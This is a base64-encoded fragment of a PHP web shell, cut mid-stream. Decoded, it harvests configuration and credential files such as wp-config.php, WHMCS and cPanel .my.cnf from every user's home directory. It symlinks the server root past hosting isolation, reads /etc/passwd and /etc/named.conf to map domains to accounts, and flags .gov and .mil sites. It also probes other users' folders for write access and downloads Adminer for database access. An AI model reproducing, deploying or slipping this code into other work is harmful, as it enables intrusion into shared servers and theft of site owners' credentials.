JfY29uZmlnID0gYXJyYXkoDQoJCQkJCQkiL2hvbWUvJHVzZXJfaWR4Ly5teS5jbmYiID0+ICJjcGFuZWwiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC8uYWNjZXNzaGFzaCIgPT4gIldITS1hY2Nlc3NoYXNoIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvcG8tY29udGVudC9jb25maWcucGhwIiA9PiAiUG9wb2ppIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvdmRvX2NvbmZpZy5waHAiID0+ICJWb29kb28iLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9idy1jb25maWdzL2NvbmZpZy5pbmkiID0+ICJCb3NXZWIiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAiID0+ICJMb2tvbWVkaWEiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwIiA9PiAiTG9rb21lZGlhIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvY2xpZW50YXJlYS9jb25maWd1cmF0aW9uLnBocCIgPT4gIldITUNTIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwIiA9PiAiV0hNQ1MiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCIgPT4gIldITUNTIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCIgPT4gInBocEJCIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAiID0+ICJEcnVwYWwiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9jb25maWcvc2V0dGluZ3MuaW5jLnBocCIgPT4gIlByZXN0YVNob3AiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9hcHAvZXRjL2xvY2FsLnhtbCIgPT4gIk1hZ2VudG8iLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAiID0+ICJKb29tbGEiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCIgPT4gIkpvb21sYSIsDQoJCQkJCQkiL2hvbWUvJHVzZXJfaWR4L3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAiID0+ICJXb3JkUHJlc3MiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCIgPT4gIldvcmRQcmVzcyIsDQoJCQkJCQkiL2hvbWUvJHVzZXJfaWR4L3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAiID0+ICJXb3JkUHJlc3MiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwIiA9PiAiT3BlbkNhcnQiLA0KCQkJCQkJIi9ob21lLyR1c2VyX2lkeC9wdWJsaWNfaHRtbC9zbGNvbmZpZy5waHAiID0+ICJTaXRlbG9rIiwNCgkJCQkJCSIvaG9tZS8kdXNlcl9pZHgvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCIgPT4gIkVsbGlzbGFiIik7DQoJCQkJCWZvcmVhY2goJGdyYWJfY29uZmlnIGFzICRjb25maWcgPT4gJG5hbWFfY29uZmlnKSB7DQoJCQkJCQkkYW1iaWxfY29uZmlnID0gZmlsZV9nZXRfY29udGVudHMoJGNvbmZpZyk7DQoJCQkJCQlpZigkYW1iaWxfY29uZmlnID09ICcnKSB7DQoJCQkJCQl9IGVsc2Ugew0KCQkJCQkJCSRmaWxlX2NvbmZpZyA9IGZvcGVuKCJpZHhfY29uZmlnLyR1c2VyX2lkeC0kbmFtYV9jb25maWcudHh0IiwidyIpOw0KCQkJCQkJCWZwdXRzKCRmaWxlX2NvbmZpZywkYW1iaWxfY29uZmlnKTsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCX0JCQ0KCQkJfQ0KCQl9CQ0KCX0NCgllY2hvICI8Y2VudGVyPjxhIGhyZWY9Jz9kaXI9JGRpci9pZHhfY29uZmlnJz48Zm9udCBjb2xvcj1saW1lPkRvbmU8L2ZvbnQ+PC9hPjwvY2VudGVyPiI7DQoJfSBlbHNlaWYoQCRfR0VUWydkbyddID09ICdzeW1saW5rJykgew0KDQpAc2V0X3RpbWVfbGltaXQoMCk7DQoNCmVjaG8gIjxicj48YnI+PGNlbnRlcj48aDE+Ky0tPVsgU3ltbGluayBdPS0tKzwvaDE+PC9jZW50ZXI+PGJyPjxicj48Y2VudGVyPjxkaXYgY2xhc3M9Y29udGVudD4iOw0KDQpAbWtkaXIoJ3N5bScsMDc3Nyk7DQokaHRhY2Nlc3MgID0gIk9wdGlvbnMgYWxsIFxuIERpcmVjdG9yeUluZGV4IFN1eC5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCiR3cml0ZSA9QGZvcGVuICgnc3ltLy5odGFjY2VzcycsJ3cnKTsNCmZ3cml0ZSgkd3JpdGUgLCRodGFjY2Vzcyk7DQpAc3ltbGluaygnLycsJ3N5bS9yb290Jyk7DQokZmlsZWxvY2F0aW9uID0gYmFzZW5hbWUoX19GSUxFX18pOw0KJHJlYWRfbmFtZWRfY29uZiA9IEBmaWxlKCcvZXRjL25hbWVkLmNvbmYnKTsNCmlmKCEkcmVhZF9uYW1lZF9jb25mKQ0Kew0KZWNobyAiPHByZSBjbGFzcz1tbDEgc3R5bGU9J21hcmdpbi10b3A6NXB4Jz4jIENhbnQgYWNjZXNzIHRoaXMgZmlsZSBvbiBzZXJ2ZXIgLT4gWyAvZXRjL25hbWVkLmNvbmYgXTwvcHJlPjwvY2VudGVyPiI7IA0KfQ0KZWxzZQ0Kew0KZWNobyAiPGJyPjxicj48ZGl2IGNsYXNzPSd0bXAnPjx0YWJsZSBib3JkZXI9JzEnIGJvcmRlcmNvbG9yPScjMDBmZjAwJyB3aWR0aD0nNTAwJyBjZWxscGFkZGluZz0nMScgY2VsbHNwYWNpbmc9JzAnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnM8L3RkPjx0ZD5zeW1saW5rIDwvdGQ+IjsNCmZvcmVhY2goJHJlYWRfbmFtZWRfY29uZiBhcyAkc3ViamVjdCl7DQppZihlcmVnaSgnem9uZScsJHN1YmplY3QpKXsNCnByZWdfbWF0Y2hfYWxsKCcjem9uZSAiKC4qKSIjJywkc3ViamVjdCwkc3RyaW5nKTsNCmZsdXNoKCk7DQppZihzdHJsZW4odHJpbSgkc3RyaW5nWzFdWzBdKSkgPjIpew0KJFVJRCA9IHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoJy9ldGMvdmFsaWFzZXMvJy4kc3RyaW5nWzFdWzBdKSk7DQokbmFtZSA9ICRVSURbJ25hbWUnXSA7DQpAc3ltbGluaygnLycsJ3N5bS9yb290Jyk7DQokbmFtZSAgID0gJHN0cmluZ1sxXVswXTsNCiRpcmFuICAgPSAnXC5pcic7DQokaXNyYWVsID0gJ1wuaWwnOw0KJGluZG8gICA9ICdcLmlkJzsNCiRzZzEyICAgPSAnXC5zZyc7DQokZWR1ICAgID0gJ1wuZWR1JzsNCiRnb3YgICAgPSAnXC5nb3YnOw0KJGdvc2UgICA9ICdcLmdvJzsNCiRnb2JlciAgPSAnXC5nb2InOw0KJG1pbDEgICA9ICdcLm1pbCc7DQokbWlsMiAgID0gJ1wubWknOw0KJG1hbGF5CT0gJ1wubXknOw0KJGNoaW5hCT0gJ1wuY24nOw0KJGphcGFuCT0gJ1wuanAnOw0KJGF1c3RyCT0gJ1wuYXUnOw0KJHBvcm4JPSAnXC54eHgnOw0KJGFzCQk9ICdcLnVrJzsNCiRjYWxmbgk9ICdcLmNhJzsNCg0KaWYgKGVyZWdpKCIkaXJhbiIsJHN0cmluZ1sxXVswXSkgb3IgZXJlZ2koIiRpc3JhZWwiLCRzdHJpbmdbMV1bMF0pIG9yIGVyZWdpKCIkaW5kbyIsJHN0cmluZ1sxXVswXSlvciBlcmVnaSgiJHNnMTIiLCRzdHJpbmdbMV1bMF0pIG9yIGVyZWdpICgiJGVkdSIsJHN0cmluZ1sxXVswXSkgb3IgZXJlZ2kgKCIkZ292Iiwkc3RyaW5nWzFdWzBdKQ0Kb3IgZXJlZ2kgKCIkZ29zZSIsJHN0cmluZ1sxXVswXSkgb3IgZXJlZ2koIiRnb2JlciIsJHN0cmluZ1sxXVswXSkgb3IgZXJlZ2koIiRtaWwxIiwkc3RyaW5nWzFdWzBdKSBvciBlcmVnaSAoIiRtaWwyIiwkc3RyaW5nWzFdWzBdKQ0Kb3IgZXJlZ2kgKCIkbWFsYXkiLCRzdHJpbmdbMV1bMF0pIG9yIGVyZWdpKCIkY2hpbmEiLCRzdHJpbmdbMV1bMF0pIG9yIGVyZWdpKCIkamFwYW4iLCRzdHJpbmdbMV1bMF0pIG9yIGVyZWdpICgiJGF1c3RyIiwkc3RyaW5nWzFdWzBdKQ0Kb3IgZXJlZ2koIiRwb3JuIiwkc3RyaW5nWzFdWzBdKSBvciBlcmVnaSgiJGFzIiwkc3RyaW5nWzFdWzBdKSBvciBlcmVnaSAoIiRjYWxmbiIsJHN0cmluZ1sxXVswXSkpDQp7DQokbmFtZSA9ICI8ZGl2IHN0eWxlPScgY29sb3I6ICNGRjAwMDAgOyB0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHggcmVkOyAnPiIuJHN0cmluZ1sxXVswXS4nPC9kaXY+JzsNCn0NCmVjaG8gIg0KPHRyPg0KDQo8dGQ+DQo8ZGl2IGNsYXNzPSdkb20nPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPWh0dHA6Ly93d3cuIi4kc3RyaW5nWzFdWzBdLicvPicuJG5hbWUuJyA8L2E+IDwvZGl2Pg0KPC90ZD4NCg0KPHRkPg0KJy4kVUlEWyduYW1lJ10uIg0KPC90ZD4NCg0KPHRkPg0KPGEgaHJlZj0nc3ltL3Jvb3QvaG9tZS8iLiRVSURbJ25hbWUnXS4iL3B1YmxpY19odG1sJyB0YXJnZXQ9J19ibGFuayc+U3ltbGluayA8L2E+DQo8L3RkPg0KDQo8L3RyPjwvZGl2PiAiOw0KZmx1c2goKTsNCn0NCn0NCn0NCn0NCg0KZWNobyAiPC9jZW50ZXI+PC90YWJsZT4iOyAgIA0KDQp9CWVsc2VpZihAJF9HRVRbJ2RvJ10gPT0gJ2FkbWluZXInKSB7DQoJJGZ1bGwgPSBzdHJfcmVwbGFjZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCAiIiwgJGRpcik7DQoJZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7DQoJCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJCSRjaCA9IGN1cmxfaW5pdCgpOw0KCQkgCSAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJCSAJICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQklOQVJZVFJBTlNGRVIsIHRydWUpOw0KCQkgCSAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsNCgkJIAkgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCQkgICAJICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsNCgkJcmV0dXJuIGN1cmxfZXhlYygkY2gpOw0KCQkgICAJICBjdXJsX2Nsb3NlKCRjaCk7DQoJCWZjbG9zZSgkZnApOw0KCQlvYl9mbHVzaCgpOw0KCQlmbHVzaCgpOw0KCX0NCglpZihmaWxlX2V4aXN0cygnYWRtaW5lci5waHAnKSkgew0KCQllY2hvICI8Y2VudGVyPjxmb250IGNvbG9yPWxpbWU+PGEgaHJlZj0nJGZ1bGwvYWRtaW5lci5waHAnIHRhcmdldD0nX2JsYW5rJz4tPiBhZG1pbmVyIGxvZ2luIDwtPC9hPjwvZm9udD48L2NlbnRlcj4iOw0KCX0gZWxzZSB7DQoJCWlmKGFkbWluZXIoImh0dHBzOi8vd3d3LmFkbWluZXIub3JnL3N0YXRpYy9kb3dubG9hZC80LjIuNC9hZG1pbmVyLTQuMi40LnBocCIsImFkbWluZXIucGhwIikpIHsNCgkJCWVjaG8gIjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48YSBocmVmPSckZnVsbC9hZG1pbmVyLnBocCcgdGFyZ2V0PSdfYmxhbmsnPi0+IGFkbWluZXIgbG9naW4gPC08L2E+PC9mb250PjwvY2VudGVyPiI7DQoJCX0gZWxzZSB7DQoJCQllY2hvICI8Y2VudGVyPjxmb250IGNvbG9yPXJlZD5nYWdhbCBidWF0IGZpbGUgYWRtaW5lcjwvZm9udD48L2NlbnRlcj4iOw0KCQl9DQoJfQ0KfSBlbHNlaWYoQCRfR0VUWydkbyddID09ICdqdW1waW5nJykgew0KCSRpID0gMDsNCgllY2hvICI8ZGl2IGNsYXNzPSdtYXJnaW46IDVweCBhdXRvOyc+IjsNCglpZihwcmVnX21hdGNoKCIvaHNwaGVyZS8iLCAkZGlyKSkgew0KCQkkdXJscyA9IGV4cGxvZGUoIlxyXG4iLCAkX1BPU1RbJ3VybCddKTsNCgkJaWYoaXNzZXQoJF9QT1NUWydqdW1wJ10pKSB7DQoJCQllY2hvICI8cHJlPiI7DQoJCQlmb3JlYWNoKCR1cmxzIGFzICR1cmwpIHsNCgkJCQkkdXJsID0gc3RyX3JlcGxhY2UoYXJyYXkoImh0dHA6Ly8iLCJ3d3cuIiksICIiLCBzdHJ0b2xvd2VyKCR1cmwpKTsNCgkJCQkkZXRjID0gIi9ldGMvcGFzc3dkIjsNCgkJCQkkZiA9IGZvcGVuKCRldGMsInIiKTsNCgkJCQl3aGlsZSgkZ2V0cyA9IGZnZXRzKCRmKSkgew0KCQkJCQkkcGVjYWggPSBleHBsb2RlKCI6IiwgJGdldHMpOw0KCQkJCQkkdXNlciA9ICRwZWNhaFswXTsNCgkJCQkJJGRpcl91c2VyID0gIi9oc3BoZXJlL2xvY2FsL2hvbWUvJHVzZXIiOw0KCQkJCQlpZihpc19kaXIoJGRpcl91c2VyKSA9PT0gdHJ1ZSkgew0KCQkJCQkJJHVybF91c2VyID0gJGRpcl91c2VyLiIvIi4kdXJsOw0KCQkJCQkJaWYoaXNfcmVhZGFibGUoJHVybF91c2VyKSkgew0KCQkJCQkJCSRpKys7DQoJCQkJCQkJJGpydyA9ICJbPGZvbnQgY29sb3I9bGltZT5SPC9mb250Pl0gPGEgaHJlZj0nP2Rpcj0kdXJsX3VzZXInPjxmb250IGNvbG9yPWdvbGQ+JHVybF91c2VyPC9mb250PjwvYT4iOw0KCQkJCQkJCWlmKGlzX3dyaXRhYmxlKCR1cmxfdXNlcikpIHsNCgkJCQkJCQkJJGpydyA9ICJbPGZvbnQgY29sb3I9bGltZT5SVzwvZm9udD5dIDxhIGhyZWY9Jz9kaXI9JHVybF91c2VyJz48Zm9udCBjb2xvcj1nb2xkPiR1cmxfdXNlcjwvZm9udD48L2E+IjsNCgkJCQkJCQl9DQoJCQkJCQkJZWNobyAkanJ3LiI8YnI+IjsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCX0NCgkJCX0NCgkJaWYoJGkgPT0gMCkgeyANCgkJfSBlbHNlIHsNCgkJCWVjaG8gIjxicj5Ub3RhbCBhZGEgIi4kaS4iIEthbWFyIGRpICIuJGlwOw0KCQl9DQoJCWVjaG8gIjwvcHJlPiI7DQoJCX0gZWxzZSB7DQoJCQllY2hvICc8Y2VudGVyPg0KCQkJCSAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCgkJCQkgIExpc3QgRG9tYWluczogPGJyPg0KCQkJCSAgPHRleHRhcmVhIG5hbWU9InVybCIgc3R5bGU9IndpZHRoOiA1MDBweDsgaGVpZ2h0OiAyNTBweDsiPic7DQoJCQkkZnAgPSBmb3BlbigiL2hzcGhlcmUvbG9jYWwvY29uZmlnL2h0dHBkL3NpdGVzL3NpdGVzLnR4dCIsInIiKTsNCgkJCXdoaWxlKCRnZXRzcyA9IGZnZXRzKCRmcCkpIHsNCgkJCQllY2hvICRnZXRzczsNCgkJCX0NCgkJCWVjaG8gICc8L3RleHRhcmVhPjxicj4NCgkJCQkgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJKdW1waW5nIiBuYW1lPSJqdW1wIiBzdHlsZT0id2lkdGg6IDUwMHB4OyBoZWlnaHQ6IDI1cHg7Ij4NCgkJCQkgIDwvZm9ybT48L2NlbnRlcj4nOw0KCQl9DQoJfSBlbHNlaWYocHJlZ19tYXRjaCgiL3Zob3N0cy8iLCAkZGlyKSkgew0KCQkkdXJscyA9IGV4cGxvZGUoIlxyXG4iLCAkX1BPU1RbJ3VybCddKTsNCgkJaWYoaXNzZXQoJF9QT1NUWydqdW1wJ10pKSB7DQoJCQllY2hvICI8cHJlPiI7DQoJCQlmb3JlYWNoKCR1cmxzIGFzICR1cmwpIHsNCgkJCQkkd2ViX3ZoID0gIi92YXIvd3d3L3Zob3N0cy8kdXJsL2h0dHBkb2NzIjsNCgkJCQlpZihpc19kaXIoJHdlYl92aCkgPT09IHRydWUpIHsNCgkJCQkJaWYoaXNfcmVhZGFibGUoJHdlYl92aCkpIHsNCgkJCQkJCSRpKys7DQoJCQkJCQkkanJ3ID0gIls8Zm9udCBjb2xvcj1saW1lPlI8L2ZvbnQ+XSA8YSBocmVmPSc/ZGlyPSR3ZWJfdmgnPjxmb250IGNvbG9yPWdvbGQ+JHdlYl92aDwvZm9udD48L2E+IjsNCgkJCQkJCWlmKGlzX3dyaXRhYmxlKCR3ZWJfdmgpKSB7DQoJCQkJCQkJJGpydyA9ICJbPGZvbnQgY29sb3I9bGltZT5SVzwvZm9udD5dIDxhIGhyZWY9Jz9kaXI9JHdlYl92aCc+PGZvbnQgY29sb3I9Z29sZD4kd2ViX3ZoPC9mb250PjwvYT4iOw0KCQkJCQkJfQ0KCQkJCQkJZWNobyAkanJ3LiI8YnI+IjsNCgkJCQkJfQ0KCQkJCX0NCgkJCX0NCgkJaWYoJGkgPT0gMCkgeyANCgkJfSBlbHNlIHsNCgkJCWVjaG8gIjxicj5Ub3RhbCBhZGEgIi4kaS4iIEthbWFyIGRpICIuJGlwOw0KCQl9DQoJCWVjaG8gIjwvcHJlPiI7DQoJCX0gZWxzZSB7DQoJCQllY2hvICc8Y2VudGVyPg0KCQkJCSAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCgkJCQkgIExpc3QgRG9tYWluczogPGJyPg0KCQkJCSAgPHRleHRhcmVhIG5hbWU9InVybCIgc3R5bGU9IndpZHRoOiA1MDBweDsgaGVpZ2h0OiAyNTBweDsiPic7DQoJCQkJICBiaW5nKCJpcDokaXAiKTsNCgkJCWVjaG8gICc8L3RleHRhcmVhPjxicj4NCgkJCQkgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJKdW1waW5nIiBuYW1lPSJqdW1wIiBzdHlsZT0id2lkdGg6IDUwMHB4OyBoZWlnaHQ6IDI1cHg7Ij4NCgkJCQkgIDwvZm9ybT48L2NlbnRlcj4nOw0KCQl9DQoJfSBlbHNlIHsNCgkJZWNobyAiPHByZT4iOw0KCQkkZXRjID0gZm9wZW4oIi9ldGMvcGFzc3dkIiwgInIiKSBvciBkaWUoIjxmb250IGNvbG9yPXJlZD5DYW4ndCByZWFkIC9ldGMvcGFzc3dkPC9mb250PiIpOw0KCQl3aGlsZSgkcGFzc3dkID0gZmdldHMoJGV0YykpIHsNCgkJCWlmKCRwYXNzd2QgPT0gJycgfHwgISRldGMpIHsNCgkJCQllY2hvICI8Zm9udCBjb2xvcj1yZWQ+Q2FuJ3QgcmVhZCAvZXRjL3Bhc3N3ZDwvZm9udD4iOw0KCQkJfSBlbHNlIHsNCgkJCQlwcmVnX21hdGNoX2FsbCgnLyguKj8pOng6LycsICRwYXNzd2QsICR1c2VyX2p1bXBpbmcpOw0KCQkJCWZvcmVhY2goJHVzZXJfanVtcGluZ1sxXSBhcyAkdXNlcl9pZHhfanVtcCkgew0KCQkJCQkkdXNlcl9qdW1waW5nX2RpciA9ICIvaG9tZS8kdXNlcl9pZHhfanVtcC9wdWJsaWNfaHRtbCI7DQoJCQkJCWlmKGlzX3JlYWRhYmxlKCR1c2VyX2p1bXBpbmdfZGlyKSkgew0KCQkJCQkJJGkrKzsNCgkJCQkJCSRqcncgPSAiWzxmb250IGNvbG9yPWxpbWU+UjwvZm9udD5dIDxhIGhyZWY9Jz9kaXI9JHVzZXJfanVtcGluZ19kaXInPjxmb250IGNvbG9yPWdvbGQ+JHVzZXJfanVtcGluZ19kaXI8L2ZvbnQ+PC9hPiI7DQoJCQkJCQlpZihpc193cml0YWJsZSgkdXNlcl9qdW1waW5nX2RpcikpIHsNCgkJCQkJCQkkanJ3ID0gIls8Zm9udCBjb2xvcj1saW1lPlJXPC9mb250Pl0gPGEgaHJlZj0nP2Rpcj0kdXNlcl9qdW1waW5nX2Rpcic+PGZvbnQgY29sb3I9Z29sZD4kdXNlcl9qdW1waW5nX2RpcjwvZm9udD48L2E+IjsNCgkJCQkJCX0NCgkJCQkJCWVjaG8gJGpydzsNCgkJCQkJCWlmKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0cHd1aWQnKSkgew0KCQkJCQkJCSRkb21haW5fanVtcCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL25hbWVkLmNvbmYiKTsJDQoJCQkJCQkJaWYoJGRvbWFpbl9qdW1wID09ICcnKSB7DQoJCQkJCQkJCWVjaG8gIiA9PiAoIDxmb250IGNvbG9yPXJlZD5nYWJpc2EgYW1iaWwgbmFtYSBkb21haW4gbnlhPC9mb250PiApPGJyPiI7DQoJCQkJCQkJfSBlbHNlIHsNCgkJCQkJCQkJcHJlZ19tYXRjaF9hbGwoIiMvdmFyL25hbWVkLyguKj8pLmRiIyIsICRkb21haW5fanVtcCwgJGRvbWFpbnNfanVtcCk7DQoJCQkJCQkJCWZvcmVhY2goJGRvbWFpbnNfanVtcFsxXSBhcyAkZGopIHsNCgkJCQkJCQkJCSR1c2VyX2p1bXBpbmdfdXJsID0gcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcigiL2V0Yy92YWxpYXNlcy8kZGoiKSk7DQoJCQkJCQkJCQkkdXNlcl9qdW1waW5nX3VybCA9ICR1c2VyX2p1bXBpbmdfdXJsWyduYW1lJ107DQoJCQkJCQkJCQlpZigkdXNlcl9qdW1waW5nX3VybCA9PSAkdXNlcl9pZHhfanVtcCkgew0KCQkJCQkJCQkJCWVjaG8gIiA9PiAoIDx1PiRkajwvdT4gKTxicj4iOw0KCQkJCQkJCQkJCWJyZWFrOw0KCQkJCQkJCQkJfQ0KCQkJCQkJCQl9DQoJCQkJCQkJfQ0KCQkJCQkJfSBlbHNlIHsNCgkJCQkJCQllY2hvICI8YnI+IjsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCX0NCgkJCX0NCgkJfQ0KCQlpZigkaSA9PSAwKSB7IA0KCQl9IGVsc2Ugew0KCQkJZWNobyAiPGJyPlRvdGFsIGFkYSAiLiRpLiIgS2FtYXIgZGkgIi4kaXA7DQoJCX0NCgkJZWNobyAiPC9wcmU+IjsNCgl9DQoJZWNobyAiPC9kaXY+IjsNCn0NCg0KJGZpbGVzID0gYXJyYXkoKTsNCiRhY3Rpb24gPSAnJzsNCmlmICghZW1wdHkoJF9QT1NUWydzdWJtaXRfYWxsJ10pKSB7DQoJJGFjdGlvbiA9ICRfUE9TVFsnYWN0aW9uX2FsbCddOw0KCWZvciAoJGkgPSAwOyAkaSA8ICRfUE9TVFsnbnVtJ107ICRpKyspIHsNCgkJaWYgKGFycmF5X2tleV9leGlzdHMoImNoZWNrZWQkaSIsICRfUE9TVCkgJiYgJF9QT1NUWyJjaGVja2VkJGkiXSA9PSAndHJ1ZScpIHsNCgkJCSRmaWxlc1tdID0gJF9QT1NUWyJmaWxlJGkiXTsNCgkJfQ0KCX0NCn0gZWxzZWlmICghZW1wdHkoJF9SRVFVRVNUWydhY3Rpb24nXSkpIHsNCgkkYWN0aW9uID0gJF9SRVFVRVNUWydhY3Rpb24nXTsNCgkkZmlsZXNbXSA9IHJlbGF0aXZlMmFic29sdXRlKCRfUkVRVUVTVFsnZmlsZSddLCAkZGlyZWN0b3J5KTsNCn0gZWxzZWlmICghZW1wdHkoJF9QT1NUWydzdWJtaXRfdXBsb2FkJ10pICYmICFlbXB0eSgkX0ZJTEVTWyd1cGxvYWQnXVsnbmFtZSddKSkgew0KCSRmaWxlc1tdID0gJF9GSUxFU1sndXBsb2FkJ107DQoJJGFjdGlvbiA9ICd1cGxvYWQnOw0KfSBlbHNlaWYgKGFycmF5X2tleV9leGlzdHMoJ251bScsICRfUE9TVCkpIHsNCglmb3IgKCRpID0gMDsgJGkgPCAkX1BPU1RbJ251bSddOyAkaSsrKSB7DQoJCWlmIChhcnJheV9rZXlfZXhpc3RzKCJzdWJtaXQkaSIsICRfUE9TVCkpIGJyZWFrOw0KCX0NCglpZiAoJGkgPCAkX1BPU1RbJ251bSddKSB7DQoJCSRhY3Rpb24gPSAkX1BPU1RbImFjdGlvbiRpIl07DQoJCSRmaWxlc1tdID0gJF9QT1NUWyJmaWxlJGkiXTsNCgl9DQp9DQppZiAoZW1wdHkoJGFjdGlvbikgJiYgKCFlbXB0eSgkX1BPU1RbJ3N1Ym1pdF9jcmVhdGUnXSkgfHwgKGFycmF5X2tleV9leGlzdHMoJ2ZvY3VzJywgJF9QT1NUKSAmJiAkX1BPU1RbJ2ZvY3VzJ10gPT0gJ2NyZWF0ZScpKSAmJiAhZW1wdHkoJF9QT1NUWydjcmVhdGVfbmFtZSddKSkgew0KCSRmaWxlc1tdID0gcmVsYXRpdmUyYWJzb2x1dGUoJF9QT1NUWydjcmVhdGVfbmFtZSddLCAkZGlyZWN0b3J5KTsNCglzd2l0Y2ggKCRfUE9TVFsnY3JlYXRlX3R5cGUnXSkgew0KCWNhc2UgJ2RpcmVjdG9yeSc6DQoJCSRhY3Rpb24gPSAnY3JlYXRlX2RpcmVjdG9yeSc7DQoJCWJyZWFrOw0KCWNhc2UgJ2ZpbGUnOg0KCQkkYWN0aW9uID0gJ2NyZWF0ZV9maWxlJzsNCgl9DQp9DQppZiAoc2l6ZW9mKCRmaWxlcykgPT0gMCkgJGFjdGlvbiA9ICcnOyBlbHNlICRmaWxlID0gcmVzZXQoJGZpbGVzKTsNCg0KaWYgKCRsYW5nID09ICdhdXRvJykgew0KCWlmIChhcnJheV9rZXlfZXhpc3RzKCdIVFRQX0FDQ0VQVF9MQU5HVUFHRScsICRfU0VSVkVSKSAmJiBzdHJsZW4oJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10pID49IDIpIHsNCgkJJGxhbmcgPSBzdWJzdHIoJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10sIDAsIDIpOw0KCX0gZWxzZSB7DQoJCSRsYW5nID0gJ2VuJzsNCgl9DQp9DQoNCiR3b3JkcyA9IGdldHdvcmRzKCRsYW5nKTsNCg0KaWYgKCRzaXRlX2NoYXJzZXQgPT0gJ2F1dG8nKSB7DQoJJHNpdGVfY2hhcnNldCA9ICR3b3JkX2NoYXJzZXQ7DQp9DQoNCiRjb2xzID0gKCR3aW4pID8gNCA6IDc7DQoNCmlmICghaXNzZXQoJGRpcnBlcm1pc3Npb24pKSB7DQoJJGRpcnBlcm1pc3Npb24gPSAoZnVuY3Rpb25fZXhpc3RzKCd1bWFzaycpKSA/ICgwNzc3ICYgfnVtYXNrKCkpIDogMDc1NTsNCn0NCmlmICghaXNzZXQoJGZpbGVwZXJtaXNzaW9uKSkgew0KCSRmaWxlcGVybWlzc2lvbiA9IChmdW5jdGlvbl9leGlzdHMoJ3VtYXNrJykpID8gKDA2NjYgJiB+dW1hc2soKSkgOiAwNjQ0Ow0KfQ0KDQppZiAoIWVtcHR5KCRfU0VSVkVSWydTQ1JJUFRfTkFNRSddKSkgew0KCSRzZWxmID0gaHRtbChiYXNlbmFtZSgkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSkpOw0KfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkpIHsNCgkkc2VsZiA9IGh0bWwoYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pKTsNCn0gZWxzZSB7DQoJJHNlbGYgPSAnJzsN